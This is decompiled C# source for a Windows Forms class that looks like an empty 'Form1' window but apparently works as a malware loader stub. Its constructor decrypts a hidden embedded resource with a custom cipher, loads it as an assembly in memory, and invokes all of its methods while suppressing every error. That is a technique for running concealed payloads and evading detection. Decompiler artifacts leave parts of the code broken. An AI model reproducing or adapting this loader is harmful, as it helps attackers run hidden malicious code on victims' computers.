using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using DGY26290.My.Resources;
using Microsoft.VisualBasic.CompilerServices;

namespace DGY26290;

[DesignerGenerated]
public class x : Form
{
	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("NotifyIcon1")]
	private NotifyIcon _NotifyIcon1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	private object horse;

	private MethodInfo ton;

	private Type t;

	private byte[] o;

	internal virtual _003F ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual _003F NotifyIcon_0
	{
		get
		{
			return _NotifyIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NotifyIcon1 = value;
		}
	}

	internal virtual _003F Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		components = new Container();
		ListBox1 = new ListBox();
		NotifyIcon_0 = new NotifyIcon(components);
		Label1 = new Label();
		((Control)this).SuspendLayout();
		((ListControl)ListBox1).set_FormattingEnabled(true);
		object listBox = (object)ListBox1;
		Point location = new Point(165, 112);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		object listBox2 = (object)ListBox1;
		Size size = new Size(120, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(0);
		((NotifyIcon)NotifyIcon_0).set_Text("NotifyIcon1");
		((NotifyIcon)NotifyIcon_0).set_Visible(true);
		((Label)Label1).set_AutoSize(true);
		object label = (object)Label1;
		location = new Point(80, 63);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		object label2 = (object)Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(1);
		((Label)Label1).set_Text("Label1");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(480, 75);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)Label1);
		((Control)this).get_Controls().Add((Control)ListBox1);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public static int momo(int nb)
	{
		return nb % 256;
	}

	public static byte[] Decrypt(byte[] input, int key)
	{
		checked
		{
			int num = input.Length - 2;
			int num2;
			for (num2 = 0; num2 <= num; num2 += 2)
			{
				int num3 = input[num2];
				int num4 = input[num2 + 1];
				int i = 2 * num4 - key - num3;
				int j;
				for (j = key - num3 + num4; j < 0; j += 256)
				{
				}
				for (; i < 0; i += 256)
				{
				}
				input[num2] = (byte)momo(j);
				num2++;
				input[num2] = (byte)momo(i);
				num2--;
			}
			return input;
		}
	}

	public Type quack(Assembly a)
	{
		return a.GetTypes()[5];
	}

	public Assembly aslo(byte[] a)
	{
		return AppDomain.CurrentDomain.Load(a);
	}

	public void gato(MethodInfo perro)
	{
		try
		{
			perro.Invoke(null, (object[])horse);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public MethodInfo[] jojo(Type xx)
	{
		return xx.GetMethods();
	}

	public x()
	{
		horse = new object[0];
		InitializeComponent();
		StringBuilder stringBuilder = new StringBuilder();
		string text = stringBuilder.Append((string?)Resources.unknown_2).ToString();
		byte[] input = (byte[])((ResourceManager)Resources.unknown_0).GetObject((string)Resources.unknown_3);
		o = Decrypt(input, Conversions.ToInteger(text));
		object obj = aslo(o);
		t = quack((Assembly)obj);
		MethodInfo[] array = jojo(t);
		foreach (MethodInfo perro in array)
		{
			gato(perro);
		}
	}

	static int smethod_0()
	{
		/*Error: Unexpected end of block*/;
	}
}
